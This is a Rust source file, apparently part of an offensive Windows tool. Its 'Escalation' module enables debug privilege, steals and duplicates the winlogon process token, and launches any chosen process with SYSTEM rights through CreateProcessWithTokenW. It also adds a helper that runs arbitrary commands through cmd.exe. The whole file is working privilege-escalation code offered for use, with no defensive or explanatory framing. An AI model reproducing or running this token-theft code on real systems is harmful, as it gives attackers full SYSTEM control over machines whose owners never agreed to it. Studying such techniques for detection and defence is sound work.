
use crate::utilities::Utils;

use winapi::um::winbase::{ 
    LOGON_NETCREDENTIALS_ONLY, 
    CreateProcessWithTokenW
};

use winapi::um::processthreadsapi::{
    OpenProcessToken,  
    OpenProcess, 
    PROCESS_INFORMATION, 
    STARTUPINFOW
};

use winapi::um::securitybaseapi::DuplicateTokenEx;

use winapi::um::winbase::CREATE_NEW_CONSOLE;

use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot,
    TH32CS_SNAPTHREAD,
    TH32CS_SNAPPROCESS,
    Process32First,
    Process32Next,
};

use winapi::um::winnt::{
    PROCESS_QUERY_INFORMATION, 
    TOKEN_QUERY, TOKEN_IMPERSONATE, 
    TOKEN_DUPLICATE, 
    TOKEN_ASSIGN_PRIMARY,
    HANDLE, 
    SecurityImpersonation, 
    SECURITY_IMPERSONATION_LEVEL, 
    TokenPrimary, 
    TOKEN_TYPE, 
    MAXIMUM_ALLOWED,
};

use winapi::shared::minwindef::TRUE;

use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::shared::ntdef::NULL;

use anyhow::{
    anyhow, 
    Result
};

use std::process::Command;

use std::io::Error;

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

pub struct Escalation;

impl Escalation {
    pub fn get_system(process_path: String) -> Result<()> {
        if Utils::is_elevated() {
            let (boolean, _result) = Utils::enable_debug_privilege();
            if boolean {
                if spawn_shell(process_path.clone()) {
                    println!("[+] {} started with SYSTEM permissions", process_path);
                } else {
                    println!("[-] Failed to start process with SYSTEM permissions encountered error: {}", Error::last_os_error());
                }
            }
        } else {
            println!("[-] Program requires atleast administrative permissions");
        }
        Ok(())
    }

    pub fn execute_shell(args: Vec<String>) -> Result<()> {
        let mut arguments: Vec<&str> = vec![];
        arguments.push("/C");

        for arg in &args[1..] {
            arguments.push(arg);
        }

        let output = Command::new("cmd.exe")
            .args(arguments)
            .output()
            .expect("failed to execute process");

        if format!("{}", output.status) == "exit code: 0" {
            if output.stdout.len() > 0 {
                println!("{}", std::str::from_utf8(&output.stdout)?);
            } else {
                println!("No output");
            }
        } else {
            println!("{}", std::str::from_utf8(&output.stderr)?);
        }
        Ok(())
    }
}

fn spawn_shell(process_path: String) -> bool {
    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        if let Ok(p_new_token) = set_access_token() {
            if CreateProcessWithTokenW(p_new_token, LOGON_NETCREDENTIALS_ONLY, to_wchar(&process_path).as_mut_ptr(), NULL as *mut u16, CREATE_NEW_CONSOLE, NULL, NULL as *const u16, &mut si, &mut pi) != 0 {
                return true;
            }
        }
        return false;
    }
}

fn to_wchar(str : &str) -> Vec<u16> {
    OsStr::new(str).encode_wide(). chain(Some(0).into_iter()).collect()
}


fn get_winlogon_pid() -> String {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
        let mut entry: winapi::um::tlhelp32::PROCESSENTRY32 = std::mem::zeroed(); 
        entry.dwSize = std::mem::size_of::<winapi::um::tlhelp32::PROCESSENTRY32>() as u32;

        if snapshot != 0 as *mut winapi::ctypes::c_void {
            let first_process = Process32First(snapshot as *mut winapi::ctypes::c_void, &mut entry);
            if first_process != 0 {
                while Process32Next(snapshot as *mut winapi::ctypes::c_void, &mut entry) != 0 {
                    let u8slice : &[u8] = std::slice::from_raw_parts(entry.szExeFile.as_ptr() as *const u8, entry.szExeFile.len());
                    if format!("{:?}", std::string::String::from_utf8_lossy(&u8slice)).contains("winlogon") {
                        return entry.th32ProcessID.to_string();
                    }
                }
            }
        }
        return "failed".to_string();
    }
}

fn set_access_token() -> Result<HANDLE> {
    unsafe {
        if let Ok(p_token) = get_access_token(get_winlogon_pid().parse::<u32>()?) {
            let se_impersonate_level: SECURITY_IMPERSONATION_LEVEL = SecurityImpersonation;
            let token_type: TOKEN_TYPE = TokenPrimary;
            let mut p_new_token: HANDLE = std::mem::zeroed();

            if DuplicateTokenEx(p_token, MAXIMUM_ALLOWED, NULL as *mut SECURITY_ATTRIBUTES, se_impersonate_level, token_type, &mut p_new_token) != 0 {
                return Ok(p_new_token);
            } else {
                return Err(anyhow!(format!("Failed to return duplicate token")));
            }
        } else {
            return Err(anyhow!(format!("Failed to get access token")));
        }
    }
}

fn get_access_token(pid: u32) -> Result<HANDLE> {
    unsafe {
        let mut token: HANDLE = std::mem::zeroed();

        let current_process = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
        if current_process != NULL {
            if OpenProcessToken(current_process, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &mut token) != 0 {
                return Ok(token);
            } else {
                return Err(anyhow!(format!("Failed to return remote process token")));
            }
        } else {
            return Err(anyhow!(format!("Failed to OpenProcess")));
        }
    }
}